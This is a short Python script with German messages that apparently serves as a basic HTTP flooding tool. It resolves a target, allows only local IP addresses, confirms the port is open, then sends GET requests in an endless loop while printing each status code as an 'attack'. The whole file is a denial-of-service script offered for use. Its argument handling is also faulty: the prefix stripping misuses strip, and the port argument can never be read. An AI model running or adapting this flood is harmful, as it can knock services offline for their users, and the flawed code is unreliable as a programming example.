#!/usr/bin/python3

import requests
import sys 
import ipaddress as ip
import socket
from os import system, name


if name == "nt":
    clear_befehl = "cls"
else:
    clear_befehl = "clear"




def hilfmir():
    print('#' * 30)
    print('{} <target> <port>'.format(sys.argv[0]))
    print('Nur Lokale IPs')
    print('#' * 30)
    sys.exit()

def check_target():
    if len(sys.argv) == 2:
        global target
        global port
        target= sys.argv[1].strip("http://") and sys.argv[1].strip("https://")

        if len(sys.argv) > 2:
            port = int(sys.argv[2])
        else:
            port = 80

        try:
            target = socket.gethostbyname(target)
        except:
            print("Fehler beim auflösen der URL")
    


        if ip.ip_address(target).is_global:
            print("keine Lokale IP")
            hilfmir()
    
            
    else:
         hilfmir()

    return True

def istonline_target(target):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
    except:
        print("Webserver funktioniert nicht")
        sys.exit(1)

    return True



def attacke(target):
        target = "http://" + target
        system(clear_befehl)
        print("[*] Greife {} an....[*]".format(target))
        try:
            while True:
                r = requests.get(target + ":" + str(port))
                print("[*] HTTP Code {} [*]".format(r.status_code))
        except KeyboardInterrupt:
            print("Schalte runter")
            sys.exit(1)
        
        
             
def main():
    if check_target() and istonline_target(target):
        attacke(target)


main()
